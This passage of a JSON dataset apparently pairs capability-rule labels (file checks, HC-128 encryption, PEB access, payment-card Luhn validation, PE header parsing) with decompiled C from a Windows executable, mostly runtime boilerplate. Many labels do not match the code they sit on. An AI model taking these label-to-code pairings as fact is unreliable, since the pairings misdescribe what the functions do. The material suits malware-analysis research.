puVar5;\n                    }\n                }\n                else {\n                    while( true ) {\n                        puVar8 = puVar4 + iVar9;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x10;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        puVar5 = puVar4 + 0x10;\n                        *puVar4 = *puVar8;\n                        *(puVar4 + 4) = uVar17;\n                        *(puVar4 + 1) = uVar18;\n                        *(puVar4 + 0xc) = uVar19;\n                        *(puVar4 + 2) = uVar20;\n                        *(puVar4 + 0x14) = uVar13;\n                        *(puVar4 + 3) = uVar14;\n                        *(puVar4 + 0x1c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x20;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x30;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        uVar11 = uVar11 - 1;\n                        *(puVar4 + 4) = *puVar8;\n                        *(puVar4 + 0x24) = uVar17;\n                        *(puVar4 + 5) = uVar18;\n                        *(puVar4 + 0x2c) = uVar19;\n                        *(puVar4 + 6) = uVar20;\n                        *(puVar4 + 0x34) = uVar13;\n                        *(puVar4 + 7) = uVar14;\n                        *(puVar4 + 0x3c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x40;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x50;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        *(puVar4 + 8) = *puVar8;\n                        *(puVar4 + 0x44) = uVar17;\n                        *(puVar4 + 9) = uVar18;\n                        *(puVar4 + 0x4c) = uVar19;\n                        *(puVar4 + 10) = uVar20;\n                        *(puVar4 + 0x54) = uVar13;\n                        *(puVar4 + 0xb) = uVar14;\n                        *(puVar4 + 0x5c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x60;\n                        uVar13 = *puVar8;\n                        uVar14 = puVar8[1];\n                        uVar15 = puVar8[2];\n                        uVar16 = puVar8[3];\n                        puVar8 = puVar4 + iVar9 + 0x70;\n                        uVar17 = *puVar8;\n                        uVar18 = puVar8[1];\n                        uVar19 = puVar8[2];\n                        uVar20 = puVar8[3];\n                        if (uVar11 == 0) break;\n                        *(puVar4 + 0xc) = uVar13;\n                        *(puVar4 + 100) = uVar14;\n                        *(puVar4 + 0xd) = uVar15;\n                        *(puVar4 + 0x6c) = uVar16;\n                        *(puVar4 + 0xe) = uVar17;\n                        *(puVar4 + 0x74) = uVar18;\n                        *(puVar4 + 0xf) = uVar19;\n                        *(puVar4 + 0x7c) = uVar20;\n                        puVar4 = puVar5;\n                    }\n                }\n                *(puVar5 + -4) = uVar13;\n                *(puVar5 + -0x1c) = uVar14;\n                *(puVar5 + -3) = uVar15;\n                *(puVar5 + -0x14) = uVar16;\n                puVar10 = puVar10 & 0x7f;\n            }\n        }\n        for (uVar11 = puVar10 >> 4; uVar11 != 0; uVar11 = uVar11 - 1) {\n            *(puVar5 + -2) = uVar17;\n            *(puVar5 + -0xc) = uVar18;\n            *(puVar5 + -1) = uVar19;\n            *(puVar5 + -4) = uVar20;\n            puVar8 = puVar5 + iVar9;\n            uVar17 = *puVar8;\n            uVar18 = puVar8[1];\n            uVar19 = puVar8[2];\n            uVar20 = puVar8[3];\n            puVar5 = puVar5 + 2;\n        }\n        uVar11 = puVar10 & 0xf;\n        if (uVar11 != 0) {\n            puVar8 = puVar5 + iVar9 + (uVar11 - 0x10);\n            uVar13 = puVar8[1];\n            uVar14 = puVar8[2];\n            uVar15 = puVar8[3];\n            *(puVar5 + (uVar11 - 0x10)) = *puVar8;\n            *(puVar5 + (uVar11 - 0xc)) = uVar13;\n            *(puVar5 + (uVar11 - 8)) = uVar14;\n            *(puVar5 + (uVar11 - 4)) = uVar15;\n        }\n        *(puVar5 + -2) = uVar17;\n        *(puVar5 + -0xc) = uVar18;\n        *(puVar5 + -1) = uVar19;\n        *(puVar5 + -4) = uVar20;\n        return arg1;\n    }\n    uVar17 = *(arg2 + 4);\n    uVar18 = *(arg2 + 1);\n    uVar19 = *(arg2 + 0xc);\n    puVar8 = arg2 + (arg3 - 0x10);\n    uVar20 = *puVar8;\n    uVar13 = puVar8[1];\n    uVar14 = puVar8[2];\n    uVar15 = puVar8[3];\n    *arg1 = *arg2;\n    *(arg1 + 4) = uVar17;\n    *(arg1 + 1) = uVar18;\n    *(arg1 + 0xc) = uVar19;\n    puVar8 = arg1 + (arg3 - 0x10);\n    *puVar8 = uVar20;\n    puVar8[1] = uVar13;\n    puVar8[2] = uVar14;\n    puVar8[3] = uVar15;\n    return arg1;\n}\n",
        "token_count": 6039
    },
    "140002c4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.140002c44(void)\n\n{\n    if (*0x14001e040 != 0xffffffff) {\n        fcn.140002ef0(*0x14001e040);\n        *0x14001e040 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 64
    },
    "14000708": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.140007088(void)\n\n{\n    if (*0x14001e060 != 0xffffffff) {\n        fcn.140009fa0(*0x14001e060);\n        *0x14001e060 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 63
    },
    "14000907": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140009070(int16_t **arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint16_t uVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    ulong var_1b0h;\n    ulong var_1b8h;\n    uchar auStack760 [32];\n    ulong uStack728;\n    uint uStack720;\n    uchar auStack712 [16];\n    ulong uStack696;\n    uint64_t uStack688;\n    int64_t iStack680;\n    int64_t *piStack672;\n    uchar auStack664 [44];\n    int16_t iStack620;\n    int16_t iStack618;\n    int16_t iStack616;\n    ulong var_74h;\n    ulong uStack72;\n    uint64_t uStack64;\n    \n    uStack64 = *0x14001e010 ^ auStack760;\n    uVar11 = 0;\n    piStack672 = arg2;\n    if (arg2 == NULL) {\n        puVar4 = fcn.1400073e0();\n        *puVar4 = 0x16;\n        fcn.1400072c0();\n    }\n    else {\n        *arg2 = 0;\n        piVar5 = *arg1;\n        auStack712 = ZEXT816(0);\n        auStack712._8_8_ = NULL;\n        auStack712._0_8_ = NULL;\n        uStack696 = 0;\n        while (piVar5 != NULL) {\n            uStack72 = CONCAT26(uStack72._6_2_, 0x3f002a);\n            piVar6 = fcn.14000b000(piVar5, &uStack72);\n            piVar5 = *arg1;\n            if (piVar6 == NULL) {\n                iVar3 = fcn.140008ee4(piVar5, 0, 0, auStack712);\ncode_r0x000140008d51:\n                if (iVar3 != 0) goto code_r0x000140008e65;\n            }\n            else {\n                while ((piVar6 != piVar5 &&\n                       ((0x2d < *piVar6 - 0x2fU || ((0x200000000801U >> (*piVar6 - 0x2fU & 0x3f) & 1) == 0))))) {\n                    piVar6 = piVar6 + -1;\n                }\n                if ((*piVar6 == 0x3a) && (piVar6 != piVar5 + 1)) {\ncode_r0x000140008c26:\n                    iVar3 = fcn.140008ee4(piVar5, 0, 0, auStack712);\ncode_r0x000140008d44:\n                    goto code_r0x000140008d51;\n                }\n                uVar8 = *piVar6 - 0x2f;\n                if ((0x2d < uVar8) || (uVar2 = 1,  (0x200000000801U >> (uVar8 & 0x3f) & 1) == 0)) {\n                    uVar2 = 0;\n                }\n                uStack720 = 0;\n                uStack728 = 0;\n                uVar15 = -uVar2 & (piVar6 - piVar5 >> 1) + 1U;\n                uStack688 = uVar15;\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(piVar5, 0, auStack664, 0);\n                if (iVar7 == -1) goto code_r0x000140008c26;\n                iStack680 = auStack712._8_8_ - auStack712._0_8_ >> 3;\n                do {\n                    if (((iStack620 != 0x2e) || ((iStack618 != 0 && ((iStack618 != 0x2e || (iStack616 != 0)))))) &&\n                       (iVar3 = fcn.140008ee4(&iStack620, piVar5, uVar15, auStack712),  uVar15 = uStack688,  iVar3 != 0)\n                       ) {\n                        (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n                        goto code_r0x000140008d44;\n                    }\n                    iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar7, auStack664);\n                } while (iVar3 != 0);\n                iVar9 = auStack712._8_8_ - auStack712._0_8_ >> 3;\n                if (iStack680 != iVar9) {\n                    fcn.14000d100(auStack712._0_8_ + iStack680, iVar9 - iStack680, 8, 0x140008b04);\n                    (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n                    iVar3 = 0;\n                    goto code_r0x000140008d51;\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n            }\n            arg1 = arg1 + 1;\n            piVar5 = *arg1;\n        }\n        uStack72 = 0;\n        iVar7 = (auStack712._8_8_ - auStack712._0_8_ >> 3) + 1;\n        uVar15 = (auStack712._8_8_ - auStack712._0_8_) + 7U >> 3;\n        if (auStack712._8_8_ < auStack712._0_8_) {\n            uVar15 = uVar11;\n        }\n        piVar10 = auStack712._0_8_;\n        uVar12 = uVar11;\n        uVar13 = uVar11;\n        if (uVar15 != 0) {\n            do {\n                iVar9 = -1;\n                do {\n                    iVar9 = iVar9 + 1;\n                } while (*(*piVar10 + iVar9 * 2) != 0);\n                piVar10 = piVar10 + 1;\n                uVar13 = uVar13 + 1 + iVar9;\n                uVar12 = uVar12 + 1;\n                uStack72 = uVar13;\n            } while (uVar12 != uVar15);\n        }\n        iVar9 = fcn.140005c30(iVar7, uStack72);\n        if (iVar9 != 0) {\n            uVar15 = iVar9 + iVar7 * 8;\n            uStack688 = uVar15;\n            if (auStack712._0_8_ != auStack712._8_8_) {\n                iStack680 = iVar9 - auStack712._0_8_;\n                piVar10 = auStack712._0_8_;\n                do {\n                    iVar7 = -1;\n                    do {\n                        iVar14 = iVar7;\n                        iVar7 = iVar14 + 1;\n                    } while (*(*piVar10 + iVar7 * 2) != 0);\n                    iVar14 = iVar14 + 2;\n                    iVar3 = fcn.14000a920(uVar15, uStack72 - (uVar15 - uStack688 >> 1), *piVar10, iVar14);\n                    if (iVar3 != 0) {\n                        uStack728 = 0;\n                        fcn.1400072e0(0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    *(iStack680 + piVar10) = uVar15;\n                    piVar10 = piVar10 + 1;\n                    uVar15 = uVar15 + iVar14 * 2;\n                } while (piVar10 != auStack712._8_8_);\n            }\n            *piStack672 = iVar9;\n        }\n        fcn.140007400(0);\ncode_r0x000140008e65:\n        uVar15 = auStack712._8_8_ + (7 - auStack712._0_8_) >> 3;\n        if (auStack712._8_8_ < auStack712._0_8_) {\n            uVar15 = uVar11;\n        }\n        piVar10 = auStack712._0_8_;\n        if (uVar15 != 0) {\n            do {\n                fcn.140007400(*piVar10);\n                uVar11 = uVar11 + 1;\n                piVar10 = piVar10 + 1;\n            } while (uVar11 != uVar15);\n        }\n        fcn.140007400(auStack712._0_8_);\n    }\n    fcn.140001a50(uStack64 ^ auStack760);\n    return;\n}\n",
        "token_count": 2011
    },
    "1400085d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400085d4(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001400085d8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 77
    },
    "1400085e": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400085e0(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001400085e4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 78
    },
    "140001e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140001e28(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140001dec(arg1);\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 52
    },
    "1400012f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1400012f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    puVar2 = fcn.140001010();\n    iVar1 = fcn.140004bf8(*puVar2, arg1, 0x104, arg2);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 109
    },
    "1400025c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400025cc(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x14001bea0; piVar1 < 0x14001bea0; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x140011240)();\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "140002c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140002c9c(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x140038b98;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x140038b70);\n        *0x140038b98 = *0x140038b98 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 115
    },
    "14000744": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140007440(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x140039790, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1400068a0();\n        } while ((iVar1 != 0) && (iVar1 = fcn.1400068e4(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.1400073e0();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 198
    },
    "140005fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140005fd4(int64_t *arg1)\n\n{\n    if (*arg1 != *0x140038e98) {\n        fcn.140005f90(*arg1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "140005ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140005ff0(int64_t *arg1)\n\n{\n    if (*arg1 != *0x140038e90) {\n        fcn.140005f90(*arg1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "14000604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140006044(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x140038e88 == 0) {\n        arg1 = fcn.140009bf8();\n        if (arg1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.140005e7c(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x140038e88;\n                iVar1 = *0x140038e90;\n            }\n            *0x140038e90 = iVar1;\n            *0x140038e88 = iVar3;\n            fcn.140007400(0);\n        }\n        fcn.140007400(arg1);\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 232
    },
    "14000640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140006400(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.14000604c(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 192
    },
    "14000782": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000782c(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x140038f30) && ((*0x14001e8e0 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.14000b4f8(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "14000786": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140007860(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x140039598) && ((*0x14001e8e0 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.140009804(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "1400089f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400089fc(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x140039580;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x140039350);\n        *0x140039580 = *0x140039580 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 110
    },
    "14000ad2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000ad28(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x14001e858) {\n            fcn.140007400(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x14001e860) {\n            fcn.140007400(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x14001e868) {\n            fcn.140007400(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x14001e870) {\n            fcn.140007400(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x14001e878) {\n            fcn.140007400(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x14001e880) {\n            fcn.140007400(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x14001e888) {\n            fcn.140007400(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x14001e8a8) {\n            fcn.140007400(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x14001e8b0) {\n            fcn.140007400(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x14001e8b8) {\n            fcn.140007400(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x14001e8c0) {\n            fcn.140007400(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x14001e8c8) {\n            fcn.140007400(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x14001e8d0) {\n            fcn.140007400(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 551
    },
    "14000ae3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000ae34(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x14001e840) {\n            fcn.140007400(*arg1);\n        }\n        if (arg1[1] != *0x14001e848) {\n            fcn.140007400(arg1[1]);\n        }\n        if (arg1[2] != *0x14001e850) {\n            fcn.140007400(arg1[2]);\n        }\n        if (arg1[0xb] != *0x14001e898) {\n            fcn.140007400(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x14001e8a0) {\n            fcn.140007400(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "14000f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000f800(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.14000f820(param_1, param_2, param_3, 0x1b);\n    return;\n}\n",
        "token_count": 56
    },
    "140004e5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.140004e5c(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x140039790, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1400068a0();\n        } while ((iVar1 != 0) && (iVar1 = fcn.1400068e4(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.1400073e0();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 200
    },
    "140005a3": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.140005a38(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    uint *puStack40;\n    int32_t *piStack32;\n    uchar *puStack24;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.1400059b4(arg1);\n    }\n    puStack40 = auStackX16;\n    auStackX32[0] = 0;\n    piStack32 = aiStackX24;\n    puStack24 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.1400057a4(auStack56, auStack48, &puStack40, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.140005968(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 415
    },
    "140005a8": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.140005a80(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    uint *puStack40;\n    int32_t *piStack32;\n    uchar *puStack24;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 0;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.1400059b4(arg1);\n    }\n    puStack40 = auStackX16;\n    auStackX32[0] = 0;\n    piStack32 = aiStackX24;\n    puStack24 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.1400057a4(auStack56, auStack48, &puStack40, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.140005968(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 415
    }
}